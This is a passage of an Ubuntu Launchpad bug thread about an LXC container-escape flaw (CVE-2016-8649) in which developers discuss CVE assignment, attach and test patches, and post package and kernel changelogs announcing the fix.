| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-16: |  |  | [#41](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/41) |
| --- | --- | --- | --- |

Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)

Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-16: |  |  | [#42](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/42) |
| --- | --- | --- | --- |

On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:

> On 11/15/2016 04:59 PM, Seth Forshee wrote:

> > On the kernel side there was previously a CVE assigned for the ptrace

> > issue - CVE-2015-8709. That restricted ptrace if the real, effective,

> > and saved uids and gids of the process were not mapped into the ptracing

> > process's user ns, but that doesn't forbid ptrace under the

> > circumstances here.

>

> Please don't reuse that CVE ID for this issue. It is clearly a different

> issue and reusing the CVE ID will only confuse everyone.

Sorry, I didn't really say what I meant to say there. Let me try again.

The patch does fix CVE-2015-8709. We aren't "reusing" it. We're

replacing a sauce patch to fix that CVE with a (better) upstream patch,

which is what we normally do when an upstream fix becomes available.

You're right that the ptrace issue here is different than the one

described by that CVE. Maybe that warrants another CVE, I'm not making

claims either way about that. All I meant to say is that we've already

taken the patch from Eric as an upstream replacement for the previous

patch to fix CVE-2015-8709.

On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:
> On 11/15/2016 04:59 PM, Seth Forshee wrote:
> > On the kernel side there was previously a CVE assigned for the ptrace
> > issue - CVE-2015-8709. That restricted ptrace if the real, effective,
> > and saved uids and gids of the process were not mapped into the ptracing
> > process's user ns, but that doesn't forbid ptrace under the
> > circumstances here.
>
> Please don't reuse that CVE ID for this issue. It is clearly a different
> issue and reusing the CVE ID will only confuse everyone.
Sorry, I didn't really say what I meant to say there. Let me try again.
The patch does fix CVE-2015-8709. We aren't "reusing" it. We're
replacing a sauce patch to fix that CVE with a (better) upstream patch,
which is what we normally do when an upstream fix becomes available.
You're right that the ptrace issue here is different than the one
described by that CVE. Maybe that warrants another CVE, I'm not making
claims either way about that. All I meant to say is that we've already
taken the patch from Eric as an upstream replacement for the previous
patch to fix CVE-2015-8709.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-17: |  |  | [#43](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/43) |
| --- | --- | --- | --- |

FYI, updated ptrace patchset by Eric, sent for inclusion: <https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html>

FYI, updated ptrace patchset by Eric, sent for inclusion: https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-17: |  |  | [#44](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/44) |
| --- | --- | --- | --- |

On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:

> FYI, updated ptrace patchset by Eric, sent for inclusion:

> <https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html>

Note that these are follow-ups to the other patch (mm: Add a user\_ns

owner to mm\_struct and fix ptrace permission checks), not replacements.

As far as I can tell they address different issues than those under

discussion here.

On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:
> FYI, updated ptrace patchset by Eric, sent for inclusion:
> https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html
Note that these are follow-ups to the other patch (mm: Add a user\_ns
owner to mm\_struct and fix ptrace permission checks), not replacements.
As far as I can tell they address different issues than those under
discussion here.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-18: |  |  | [#45](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/45) |
| --- | --- | --- | --- |

The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.

The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-18: |  |  | [#46](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/46) |
| --- | --- | --- | --- |

@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they're ready for the point release).

@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they're ready for the point release).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#47](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/47) |
| --- | --- | --- | --- |

* [LXC patch for master.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383)
  (14.8 KiB,
  text/plain)

LXC patch for master.

LXC patch for master.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#48](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/48) |
| --- | --- | --- | --- |

* [LXC patch for stable-2.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384)
  (15.3 KiB,
  text/plain)

LXC patch for stable-2.0.

LXC patch for stable-2.0.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-18: |  |  | [#49](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/49) |
| --- | --- | --- | --- |

* [LXC patch for stable-1.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385)
  (15.4 KiB,
  text/plain)

LXC patch for stable-1.0.

LXC patch for stable-1.0.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-22: |  |  | [#50](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/50) |
| --- | --- | --- | --- |

Packages for all Ubuntu releases have been uploaded to the LXC security PPA: [https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages](https://launchpad.net/~ubuntu-lxc-security/%2Barchive/ubuntu/devirt-security/%2Bpackages)

Packages for all Ubuntu releases have been uploaded to the LXC security PPA: https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-22: |  |  | [#51](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/51) |
| --- | --- | --- | --- |

I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.

I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-22: |  |  | [#52](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/52) |
| --- | --- | --- | --- |

I've tested the {yakkety,xenial,trusty}-{i386,amd64} packages by doing upgrade testing and also tested lxc-{create,start,ls,info,attach,stop,destroy} with privileged and unprivileged containers. All testing went as expected.

I also compared the amd64 build logs between what's currently in -updates and the binary packages built in the PPA. They're all clean.

I'll publish to {yakkety,xenial,trusty}-security on the CRD tomorrow and then publish a USN. Thanks to you all!

I've tested the {yakkety,xenial,trusty}-{i386,amd64} packages by doing upgrade testing and also tested lxc-{create,start,ls,info,attach,stop,destroy} with privileged and unprivileged containers. All testing went as expected.
I also compared the amd64 build logs between what's currently in -updates and the binary packages built in the PPA. They're all clean.
I'll publish to {yakkety,xenial,trusty}-security on the CRD tomorrow and then publish a USN. Thanks to you all!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-23: |  |  | [#53](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/53) |
| --- | --- | --- | --- |

I've verified the ptrace fix in all -proposed kernels.

I've verified the ptrace fix in all -proposed kernels.

| **tags**: | added: verification-done-trusty verification-done-vivid verification-done-xenial verification-done-yakketyremoved: verification-needed-trusty verification-needed-vivid verification-needed-xenial verification-needed-yakkety |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#54](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/54) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4

---------------

lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4
---------------
lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#55](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/55) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2

---------------

lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2
---------------
lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#56](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/56) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 1.1.5-0ubuntu0.15.04.4

---------------

lxc (1.1.5-0ubuntu0.15.04.4) vivid-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 1.1.5-0ubuntu0.15.04.4
---------------
lxc (1.1.5-0ubuntu0.15.04.4) vivid-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#57](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/57) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu1~ubuntu16.04.3

---------------

lxc (2.0.5-0ubuntu1~ubuntu16.04.3) xenial-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu1~ubuntu16.04.3
---------------
lxc (2.0.5-0ubuntu1~ubuntu16.04.3) xenial-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu Xenial): | |
| --- | --- |
| **status**: | New → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-23: |  |  | [#58](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/58) |
| --- | --- | --- | --- |

This bug was fixed in the package lxc - 2.0.5-0ubuntu4

---------------

lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium

\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: [#1639345](/bugs/1639345))

    - attach: Do not send procfd to attached process

    - CVE-2016-8649

-- Stéphane Graber <email address hidden> Tue, 22 Nov 2016 00:49:00 -0500

This bug was fixed in the package lxc - 2.0.5-0ubuntu4
---------------
lxc (2.0.5-0ubuntu4) zesty-security; urgency=medium
\* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
- attach: Do not send procfd to attached process
- CVE-2016-8649
-- Stéphane Graber <stgraber@ubuntu.com> Tue, 22 Nov 2016 00:49:00 -0500

| Changed in lxc (Ubuntu): | |
| --- | --- |
| **status**: | Triaged → Fix Released |

[Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks)
on 2016-11-23

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brad Figg (brad-figg)](https://launchpad.net/~brad-figg) wrote on 2016-11-23:  [**Missing required logs.**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/59) |  |  | [#59](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/59) |
| --- | --- | --- | --- |

This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:

apport-collect 1639345

and then change the status of the bug to 'Confirmed'.

If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to 'Confirmed'.

This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

This bug is missing log files that will aid in diagnosing the problem. From a terminal window please run:
apport-collect 1639345
and then change the status of the bug to 'Confirmed'.
If, due to the nature of the issue you have encountered, you are unable to run this command, please add a comment stating that fact and change the bug status to 'Confirmed'.
This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | New → Incomplete |

[Stéphane Graber (stgraber)](https://launchpad.net/~stgraber)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Incomplete → New |
| **tags**: | added: bot-stop-nagging |

[Brad Figg (brad-figg)](https://launchpad.net/~brad-figg)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | New → Incomplete |

[Stéphane Graber (stgraber)](https://launchpad.net/~stgraber)
on 2016-11-23

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Incomplete → Triaged |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Steve Langasek (vorlon)](https://launchpad.net/~vorlon) wrote on 2016-11-30:  [**Update Released**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/61) |  |  | [#61](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/61) |
| --- | --- | --- | --- |

The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates. Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report. In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.

The verification of the Stable Release Update for linux-lts-trusty has completed successfully and the package has now been released to -updates. Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report. In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#62](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/62) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 3.13.0-103.150

---------------

linux (3.13.0-103.150) trusty; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644489](/bugs/1644489)

\* Possible regression on 3.13.0-102.149~precise1 x86\_64 (gce) (LP: [#1644302](/bugs/1644302))

    - SAUCE: apparmor: delete extra variable dev\_path

linux (3.13.0-102.149) trusty; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640581](/bugs/1640581)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped

      uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* Syntax error extra parenthesis linux-headers-3.13.0-100/Makefile

    (LP: [#1636625](/bugs/1636625))

    - Makefile: fix extra parenthesis typo when CC\_STACKPROTECTOR\_REGULAR is

      enabled

\* Add a driver for Amazon Elastic Network Adapters (ENA) (LP: [#1635721](/bugs/1635721))

    - lib/bitmap.c: conversion routines to/from u32 array

    - kernel.h: define u8, s8, u32, etc. limits

    - net: ethtool: add new ETHTOOL\_xLINKSETTINGS API

    - PCI/MSI: Add pci\_msix\_vec\_count()

    - etherdevice: Use ether\_addr\_copy to copy an Ethernet address

    - net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)

    - [config] enable CONFIG\_ENA\_ETHERNET=m (Amazon ENA driver)

\* CVE-2016-8658

    - brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()

\* CVE-2016-7425

    - scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()

\* srcname from mount rule corrupted under load (LP: [#1634753](/bugs/1634753))

    - SAUCE: apparmor: fix sleep in critical section

\* ghash-clmulni-intel module fails to load (LP: [#1633058](/bugs/1633058))

    - crypto: ghash-clmulni - Fix load failure

    - crypto: cryptd - Assign statesize properly

-- Luis Henriques <email address hidden> Thu, 24 Nov 2016 09:56:54 +0000

This bug was fixed in the package linux - 3.13.0-103.150
---------------
linux (3.13.0-103.150) trusty; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644489
\* Possible regression on 3.13.0-102.149~precise1 x86\_64 (gce) (LP: #1644302)
- SAUCE: apparmor: delete extra variable dev\_path
linux (3.13.0-102.149) trusty; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640581
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* Syntax error extra parenthesis linux-headers-3.13.0-100/Makefile
(LP: #1636625)
- Makefile: fix extra parenthesis typo when CC\_STACKPROTECTOR\_REGULAR is
enabled
\* Add a driver for Amazon Elastic Network Adapters (ENA) (LP: #1635721)
- lib/bitmap.c: conversion routines to/from u32 array
- kernel.h: define u8, s8, u32, etc. limits
- net: ethtool: add new ETHTOOL\_xLINKSETTINGS API
- PCI/MSI: Add pci\_msix\_vec\_count()
- etherdevice: Use ether\_addr\_copy to copy an Ethernet address
- net: ena: Add a driver for Amazon Elastic Network Adapters (ENA)
- [config] enable CONFIG\_ENA\_ETHERNET=m (Amazon ENA driver)
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* srcname from mount rule corrupted under load (LP: #1634753)
- SAUCE: apparmor: fix sleep in critical section
\* ghash-clmulni-intel module fails to load (LP: #1633058)
- crypto: ghash-clmulni - Fix load failure
- crypto: cryptd - Assign statesize properly
-- Luis Henriques <luis.henriques@canonical.com> Thu, 24 Nov 2016 09:56:54 +0000

| Changed in linux (Ubuntu Trusty): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#63](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/63) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 3.19.0-75.83

---------------

linux (3.19.0-75.83) vivid; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640613](/bugs/1640613)

\* lxc-attach to malicious container allows access to host (LP: [#1639345](/bugs/1639345))

    - Revert "UBUNTU: ptrace: being capable wrt a process requires mapped

      uids/gids"

    - (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission

      checks

\* CVE-2016-8658

    - brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()

\* CVE-2016-7425

    - scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()

-- Luis Henriques <email address hidden> Wed, 09 Nov 2016 22:48:56 +0000

This bug was fixed in the package linux - 3.19.0-75.83
---------------
linux (3.19.0-75.83) vivid; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1640613
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: ptrace: being capable wrt a process requires mapped
uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* CVE-2016-8658
- brcmfmac: avoid potential stack overflow in brcmf\_cfg80211\_start\_ap()
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
-- Luis Henriques <luis.henriques@canonical.com> Wed, 09 Nov 2016 22:48:56 +0000

| Changed in linux (Ubuntu Vivid): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-11-30: |  |  | [#64](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/64) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/64/%2Bdownload) (22.5 KiB)

This bug was fixed in the package linux - 4.4.0-51.72

---------------

linux (4.4.0-51.72) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644611](/bugs/1644611)

\* 4.4.0-1037-snapdragon #41: kernel panic on boot (LP: [#1644596](/bugs/1644596))

    - Revert "dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute"

    - Revert "powerpc: implement the DMA\_ATTR\_NO\_WARN attribute"

    - Revert "nvme: use the DMA\_ATTR\_NO\_WARN attribute"

linux (4.4.0-50.71) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1644169](/bugs/1644169)

\* xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: [#1644165](/bugs/1644165))

    - Revert "UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by

      default"

    - Revert "UBUNTU: SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for

      userns root"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for

      CAP\_FSETID in s\_user\_ns""

    - Revert "UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change

      ownership of inodes"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to

      change ownership of inodes with unmappable ids""

    - Revert "UBUNTU: SAUCE: (namespace) security/integrity: Harden against

      malformed xattrs"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns

      to set xattrs""

    - Revert "(namespace) dquot: For now explicitly don't support filesystems

      outside of init\_user\_ns"

    - Revert "(namespace) quota: Handle quota data stored in s\_user\_ns in

      quota\_setxquota"

    - Revert "(namespace) quota: Ensure qids map to the filesystem"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to

      s\_user\_ns""

    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed

      to dqget() be valid and map into s\_user\_ns""

    - Revert "(namespace) vfs: Don't create inodes with a uid or gid unknown to

      the vfs"

    - Revert "(namespace) vfs: Don't modify inodes with a uid or gid unknown to

      the vfs"

    - Revert "UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs"

    - Revert "UBUNTU: SAUCE: (namespace) posix\_acl: Export

      posix\_acl\_fix\_xattr\_userns() to modules"

    - Revert "(namespace) vfs: Verify acls are valid within superblock's

      s\_user\_ns."

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Update posix\_acl support to

      handle user namespace mounts""

    - Revert "(namespace) fs: Refuse uid/gid changes which don't map into

      s\_user\_ns"

    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which

      don't map into s\_user\_ns""

    - Revert "(namespace) mnt: Move the FS\_USERNS\_MOUNT check into sget\_userns"

linux (4.4.0-49.70) xenial; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1640921](/bugs/1640921)

\* Infiniband driver (kernel module) needed for Azure (LP: [#1641139](/bugs/1641139))

    - SAUCE: RDMA Infiniband for Windows Azure

    - [Config] CONFIG\_HYPERV\_INFINIBAND\_ND=m

    - SAUCE: Makefile RDMA infiniband driver for Windows Azure

    - [Config] Add hv\_network\_direct.ko to generic inclusion list

    - SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64...

This bug was fixed in the package linux - 4.4.0-51.72
---------------
linux (4.4.0-51.72) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644611
\* 4.4.0-1037-snapdragon #41: kernel panic on boot (LP: #1644596)
- Revert "dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute"
- Revert "powerpc: implement the DMA\_ATTR\_NO\_WARN attribute"
- Revert "nvme: use the DMA\_ATTR\_NO\_WARN attribute"
linux (4.4.0-50.71) xenial; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1644169
\* xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: #1644165)
- Revert "UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by
default"
- Revert "UBUNTU: SAUCE: (namespace) fs: Don't remove suid for CAP\_FSETID for
userns root"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for
CAP\_FSETID in s\_user\_ns""
- Revert "UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change
ownership of inodes"
- Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to
change ownership of inodes with unmappable ids""
- Revert "UBUNTU: SAUCE: (namespace) security/integrity: Harden against
malformed xattrs"
- Revert "(namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s\_user\_ns
to set xattrs""
- Revert "(namespace) dquot: For now explicitly don't support filesystems
outside of init\_user\_ns"
- Revert "(namespace) quota: Handle quota data stored in s\_user\_ns in
quota\_setxquota"
- Revert "(namespace) quota: Ensure qids map to the filesystem"
- Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to
s\_user\_ns""
- Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed
to dqget() be valid and map into s\_user\_ns""
- Revert "(namespace) vfs: Don't create inodes with a uid or gid unknown to
the vfs"
